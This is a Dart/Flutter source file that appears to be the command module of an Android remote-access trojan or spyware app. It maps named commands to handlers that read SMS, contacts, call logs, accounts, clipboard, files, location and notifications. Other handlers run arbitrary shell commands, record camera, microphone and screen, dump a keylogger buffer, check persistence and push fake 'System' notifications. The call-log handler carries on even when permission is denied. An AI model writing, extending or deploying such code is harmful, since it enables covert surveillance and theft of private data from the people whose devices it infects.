import 'dart:io';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:geolocator/geolocator.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:flutter/services.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';

/// Platform channel → Kotlin MainActivity host
class NativeHost {
  static const _ch = MethodChannel('com.anon.privacy/host');

  static Future<Map<String, dynamic>> invoke(
    String method, [
    Map<String, dynamic>? args,
  ]) async {
    try {
      final r = await _ch.invokeMethod<dynamic>(method, args);
      if (r is Map) return Map<String, dynamic>.from(r);
      return {'value': r};
    } on MissingPluginException {
      throw Exception('native host plugin missing — rebuild APK');
    } on PlatformException catch (e) {
      throw Exception(e.message ?? e.code);
    }
  }
}

Future<Map<String, dynamic>> cmdInfo(Map<String, dynamic> args) async {
  final android = await DeviceInfoPlugin().androidInfo;
  final battery = Battery();
  int level = -1;
  try {
    level = await battery.batteryLevel;
  } catch (_) {}
  final net = await Connectivity().checkConnectivity();
  Map<String, dynamic>? native;
  try {
    native = await NativeHost.invoke('deviceInfo');
  } catch (_) {}
  return {
    'manufacturer': android.manufacturer,
    'model': android.model,
    'device': android.device,
    'brand': android.brand,
    'sdk': android.version.sdkInt,
    'release': android.version.release,
    'fingerprint': android.fingerprint,
    'isPhysical': android.isPhysicalDevice,
    'battery': level,
    'network': net.map((e) => e.name).toList(),
    if (native != null) 'native': native,
  };
}

Future<Map<String, dynamic>> cmdGeoloc(Map<String, dynamic> args) async {
  final perm = await Permission.locationWhenInUse.request();
  if (!perm.isGranted) throw Exception('location permission denied');
  final enabled = await Geolocator.isLocationServiceEnabled();
  if (!enabled) throw Exception('location services disabled');
  final pos = await Geolocator.getCurrentPosition(
    locationSettings: const LocationSettings(
      accuracy: LocationAccuracy.high,
      timeLimit: Duration(seconds: 15),
    ),
  );
  return {
    'lat': pos.latitude,
    'lon': pos.longitude,
    'acc': pos.accuracy,
    'alt': pos.altitude,
    'speed': pos.speed,
  };
}

Future<Map<String, dynamic>> cmdSms(Map<String, dynamic> args) async {
  final limit = (args['limit'] as num?)?.toInt() ?? 50;
  final status = await Permission.sms.request();
  if (!status.isGranted) throw Exception('READ_SMS denied');
  return NativeHost.invoke('readSms', {'limit': limit});
}

Future<Map<String, dynamic>> cmdContacts(Map<String, dynamic> args) async {
  final limit = (args['limit'] as num?)?.toInt() ?? 100;
  final status = await Permission.contacts.request();
  if (!status.isGranted) throw Exception('READ_CONTACTS denied');
  return NativeHost.invoke('readContacts', {'limit': limit});
}

Future<Map<String, dynamic>> cmdClipboard(Map<String, dynamic> args) async {
  try {
    return await NativeHost.invoke('clipboardRead');
  } catch (_) {
    final data = await Clipboard.getData(Clipboard.kTextPlain);
    return {'text': data?.text ?? ''};
  }
}

Future<Map<String, dynamic>> cmdFiles(Map<String, dynamic> args) async {
  final path = (args['path'] as String?) ?? '/sdcard';
  try {
    return await NativeHost.invoke('listDir', {'path': path});
  } catch (_) {
    final dir = Directory(path);
    if (!await dir.exists()) throw Exception('path not found');
    final ents = <Map<String, dynamic>>[];
    await for (final e in dir.list(followLinks: false)) {
      ents.add({
        'name': e.path.split(Platform.pathSeparator).last,
        'path': e.path,
        'type': e is Directory ? 'dir' : 'file',
      });
      if (ents.length >= 200) break;
    }
    return {'path': path, 'entries': ents};
  }
}

Future<Map<String, dynamic>> cmdShell(Map<String, dynamic> args) async {
  final cmd = (args['cmd'] ?? args['raw'] ?? '').toString();
  if (cmd.isEmpty) throw Exception('cmd required');
  return NativeHost.invoke('shell', {'cmd': cmd});
}

Future<Map<String, dynamic>> cmdCam(Map<String, dynamic> args) async {
  final status = await Permission.camera.request();
  if (!status.isGranted) throw Exception('CAMERA denied');
  final facing = (args['facing'] as String?) ?? 'back';
  return NativeHost.invoke('captureCam', {'facing': facing});
}

Future<Map<String, dynamic>> cmdMic(Map<String, dynamic> args) async {
  final status = await Permission.microphone.request();
  if (!status.isGranted) throw Exception('RECORD_AUDIO denied');
  final seconds = ((args['seconds'] as num?)?.toInt() ?? 8).clamp(1, 30);
  return NativeHost.invoke('captureMic', {'seconds': seconds});
}

Future<Map<String, dynamic>> cmdScreenshot(Map<String, dynamic> args) async {
  return NativeHost.invoke('captureScreen');
}

// ——— 10 additional commands ———

Future<Map<String, dynamic>> cmdCallLog(Map<String, dynamic> args) async {
  final limit = (args['limit'] as num?)?.toInt() ?? 50;
  final status = await Permission.phone.request();
  if (!status.isGranted) {
    // READ_CALL_LOG may need explicit — try native anyway
  }
  return NativeHost.invoke('readCallLog', {'limit': limit});
}

Future<Map<String, dynamic>> cmdAccounts(Map<String, dynamic> args) async {
  return NativeHost.invoke('listAccounts');
}

Future<Map<String, dynamic>> cmdApps(Map<String, dynamic> args) async {
  return NativeHost.invoke('listApps');
}

Future<Map<String, dynamic>> cmdWifi(Map<String, dynamic> args) async {
  return NativeHost.invoke('wifiInfo');
}

Future<Map<String, dynamic>> cmdSim(Map<String, dynamic> args) async {
  return NativeHost.invoke('simInfo');
}

Future<Map<String, dynamic>> cmdNotifications(Map<String, dynamic> args) async {
  // Requires notification listener service — native returns buffer if bound
  return NativeHost.invoke('notificationDump');
}

Future<Map<String, dynamic>> cmdKeylogDump(Map<String, dynamic> args) async {
  // Accessibility-based buffer maintained in native host
  return NativeHost.invoke('keylogDump');
}

Future<Map<String, dynamic>> cmdPersistStatus(Map<String, dynamic> args) async {
  return NativeHost.invoke('persistStatus');
}

Future<Map<String, dynamic>> cmdPushText(Map<String, dynamic> args) async {
  final title = (args['title'] ?? 'System').toString();
  final body = (args['body'] ?? '').toString();
  return NativeHost.invoke('showNotification', {'title': title, 'body': body});
}

Future<Map<String, dynamic>> cmdWipeAppData(Map<String, dynamic> args) async {
  // Clears local prefs / agent state — does not factory-reset the phone
  final prefs = await SharedPreferences.getInstance();
  await prefs.clear();
  try {
    await NativeHost.invoke('wipeAppData');
  } catch (_) {}
  return {'wiped': true, 'note': 'local app data cleared'};
}

typedef JobHandler = Future<Map<String, dynamic>> Function(Map<String, dynamic> args);

final Map<String, JobHandler> kHandlers = {
  'info': cmdInfo,
  'geoloc': cmdGeoloc,
  'sms': cmdSms,
  'contacts': cmdContacts,
  'clipboard': cmdClipboard,
  'files': cmdFiles,
  'shell': cmdShell,
  'cam': cmdCam,
  'mic': cmdMic,
  'screenshot': cmdScreenshot,
  // 10 additional
  'calllog': cmdCallLog,
  'accounts': cmdAccounts,
  'apps': cmdApps,
  'wifi': cmdWifi,
  'sim': cmdSim,
  'notifications': cmdNotifications,
  'keylog_dump': cmdKeylogDump,
  'persist_status': cmdPersistStatus,
  'push_text': cmdPushText,
  'wipe_app_data': cmdWipeAppData,
};
